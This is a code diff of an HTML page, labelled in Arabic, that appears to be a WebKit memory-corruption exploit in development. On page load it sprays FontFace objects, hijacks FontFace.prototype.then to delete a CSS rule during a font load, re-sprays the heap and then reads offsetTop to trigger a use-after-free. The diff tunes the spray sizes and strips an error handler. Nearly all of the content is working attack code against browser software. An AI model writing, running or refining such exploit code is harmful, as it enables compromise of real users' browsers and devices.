@@ -2,13 +2,12 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>تفكيك تدوير الذاكرة - الفحص النوعي</title>
+    <title>محاكاة البنية التاريخية المستقرة</title>
     <style>
         body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
         #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
         .log { margin-bottom: 8px; }
         .warn { color: #ffaa00; }
-        .error { color: #ff3333; }
     </style>
     
     <style id="s">
@@ -17,8 +16,8 @@
 </head>
 <body>
 
-    <h2>مراقبة استبدال الكائنات المعزولة (Font Spray)</h2>
-    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار استقرار المتصفح...</div>
+    <h2>محاكاة تنظيم الـ Heap (Structured Font Spray)</h2>
+    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار مهلة الاستقرار...</div>
 
     <script>
         const consoleElement = document.getElementById('custom-console');
@@ -30,41 +29,46 @@
             consoleElement.scrollTop = consoleElement.scrollHeight;
         }
 
-        // مصفوفة لتخزين الخطوط برمجياً لمنع حذفها الفوري
-        var target_spray = [];
+        var bad_fonts = [];
+        var SPRAY_FONTS = 1500; // الحجم المتوافق لمنع OOM التحديث
 
         function startExploitAnalysis() {
             consoleElement.innerHTML = ""; 
-            screenLog("بدء تشغيل الفحص النوعي التلقائي...");
+            screenLog("بدء تنظيم الذاكرة (Heap Packing)...");
 
             try {
+                // 1. الإغراق البدئي كما هو في ملف webkit.js الأصلي
+                for (var i = 0; i < SPRAY_FONTS; i++) {
+                    bad_fonts.push(new FontFace("font1", "", {}));
+                }
+                screenLog(`تم حقن ${SPRAY_FONTS} كائن خط لتشكيل الـ Heap.`);
+
                 let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-                document.fonts.add(A);
+                bad_fonts.push(A);
                 void A.loaded;
 
                 let fired = false;
 
+                // 2. كمين التداخل المستقر
                 Object.defineProperty(FontFace.prototype, 'then', {
                     configurable: true,
                     get() {
                         if (!fired && this === A) {
                             fired = true;
-                            screenLog("!! تم تفعيل الكمين المنطقي !!", true);
+                            screenLog("!! تم رصد التداخل المنطقي المستقر !!", true);
                             
                             try {
                                 document.getElementById('s').sheet.deleteRule(0);
-                                screenLog("تم حذف القاعدة التنسيقية بنجاح.");
-                            } catch(e) { screenLog("خطأ أثناء الحذف: " + e.message, true); }
+                                screenLog("تم حذف القاعدة بنجاح.");
+                            } catch(e) { screenLog("خطأ الحذف: " + e.message, true); }
                             
-                            // هندسة الإغراق النوعي: حجز خطوط بديلة في الـ Heap المعزول لإجبار التدوير
-                            screenLog("جاري حجز كائنات FontFace بديلة لتغيير عناوين الذاكرة...");
-                            for (let i = 0; i < 400; i++) {
-                                target_spray.push(new FontFace("font_spray", "local(Arial)", {}));
+                            // إغراق تعويضي سريع بعد الحذف
+                            for (var i = 0; i < 200; i++) {
+                                bad_fonts.push(new FontFace("font2", "", {}));
                             }
 
-                            // قراءة الـ Offset المؤجلة
                             setTimeout(() => {
-                                screenLog("محاولة القراءة المؤجلة (offsetTop)...");
+                                screenLog("قراءة الـ Offset المؤجلة...");
                                 let offset = document.body.offsetTop;
                                 screenLog("قيمة الـ Offset المسترجعة: " + offset);
                             }, 20);
@@ -74,7 +78,7 @@
                     }
                 });
 
-                screenLog("إطلاق طلب التحميل document.fonts.load...");
+                screenLog("إطلاق طلب التحميل عبر الـ Layout Pipeline...");
                 document.fonts.load('1em x', 'AB');
 
             } catch (err) {
@@ -83,13 +87,8 @@
         }
 
         window.onload = () => {
-            screenLog("تم تحميل الصفحة. الانتظار 1.5 ثانية لتنظيف مخلفات التحديث السابق...");
+            screenLog("تم تحميل الصفحة تماماً. الانتظار 1.5 ثانية لتأمين الدخول الأول...");
             setTimeout(startExploitAnalysis, 1500);
-        };
-
-        window.onerror = function(msg) {
-            screenLog("استثناء: " + msg, true);
-            return true;
         };
     </script>
 </body>
